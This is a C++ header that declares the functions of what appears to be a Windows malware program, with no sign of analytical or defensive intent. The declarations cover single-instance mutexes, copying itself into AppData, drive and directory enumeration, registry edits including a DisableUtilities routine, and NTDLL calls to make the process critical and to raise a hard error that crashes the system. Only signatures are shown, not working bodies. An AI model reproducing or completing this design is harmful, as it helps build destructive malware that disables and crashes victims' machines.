#pragma once

/* Debug MessageBox Template
#ifdef DEBUG
			MessageBox(NULL, L"", L"", MB_OK | MB_SYSTEMMODAL | MB_ICON);
#endif
*/

// Defines
#define WARN
#define DEBUG

// Macros
#define MAX_SMPO 256
#define MIN_RSLEN 8
#define MAX_RSLEN 16

#define HOST_MUTEX L"Global\\Win32M.N0T-iLLerka.X:Argv./host.Proc(running)"
#define HOST_SEMAPHORE L"Global\\Win32S.N0T-iLLerka.X:Argv./host.Proc(running)"

// Function Macros
#define RandomStringGenerator	RandomStringGeneratorW
#define CreateRegistryKey		CreateRegistryKeyW
#define CheckRegistryKey		CheckRegistryKeyW
#define DriveEnumerator			DriveEnumeratorW
#define CheckMutex				CheckMutexW
#define CheckSemaphore			CheckSemaphoreW
#define CopyFileAppData			CopyFileAppDataW
#define DirectoryIeterator		DirectoryIeteratorW

// Header Files
#include <vector>
#include <string>
#include "Windows.h"
#include "bcrypt.h"
#include "Shlobj.h"

// Libraries
#pragma comment(lib, "bcrypt.lib")

// Arrays
extern const WCHAR CharSet[];
extern const size_t nCharSet;

// FileSystem Functions
BOOL CopyFileAppDataW(LPCWSTR lpAdpn, LPCWSTR lpAdfn, WCHAR mfn[]);
BOOL DriveEnumeratorW(std::vector<std::wstring>& vwsDrive);
BOOL DirectoryIeteratorW(std::wstring wsDir, std::wstring wsMask, std::vector<std::wstring>& vwsDir, std::vector<std::wstring>& vwsFile);

// Synchronization Functions
BOOL CheckMutexW(LPCWSTR lpName);
BOOL CheckSemaphoreW(LPCWSTR lpName);

// RegEdit Functions
BOOL CreateRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, DWORD dwValue);
BOOL CheckRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD edwType, BYTE ebValue);
BOOL DisableUtilities(VOID);

// Utilitie Functions
INT RandomNumberGenerator(VOID);
std::wstring RandomStringGeneratorW(INT rsg_strlen);
BOOL IsUserAdmin(VOID);

// NT Utilitie Functions
BOOL ImportNTDLLFunctions(VOID);
BOOL NTSetProcessIsCritical(BOOLEAN blIscritical);
BOOL NTRaiseHardError(VOID);